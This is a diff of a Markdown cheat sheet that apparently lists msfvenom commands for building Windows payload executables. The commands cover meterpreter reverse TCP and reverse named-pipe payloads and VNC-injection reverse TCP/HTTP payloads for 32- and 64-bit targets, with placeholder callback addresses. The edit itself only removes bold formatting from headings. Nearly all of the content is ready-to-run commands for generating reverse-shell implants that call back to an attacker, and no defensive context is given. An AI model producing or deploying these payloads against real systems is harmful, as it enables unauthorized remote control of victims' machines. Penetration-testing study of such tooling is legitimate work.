@@ -2,7 +2,7 @@
 
 ## Interactive Shells
 
-1. **x86 (32-bit) Payloads**
+1. x86 (32-bit) Payloads
 
 `$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f exe -o met-x86.exe`
 
@@ -16,7 +16,7 @@
 
 `$ msfvenom -p windows/meterpreter/reverse_named_pipe pipehost=<compromised_target_IP> pipename=<PIPENAME> -f exe -o met-x86.exe`
 
-2. **x86-64 (64-bit) Payloads**
+2. x86-64 (64-bit) Payloads
 
 `$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f exe -o met-x64.exe`
 
@@ -30,13 +30,13 @@
 
 ## VNC
 
-1. **x86 (32-bit) Payloads**
+1. x86 (32-bit) Payloads
 
 `$ msfvenom -p windows/vncinject/reverse_tcp lhost=<IP> lport=<PORT> -f exe -o vnc-x86.exe`
 
 `$ msfvenom -p windows/vncinject/reverse_http lhost=<IP> lport=<PORT> -f exe -o vnc-x86.exe`
 
-2. **x86-64 (64-bit) Payloads**
+2. x86-64 (64-bit) Payloads
 
 `$ msfvenom -p windows/x64/vncinject/reverse_tcp lhost=<IP> lport=<PORT> -f exe -o vnc-x86-64.exe`
 
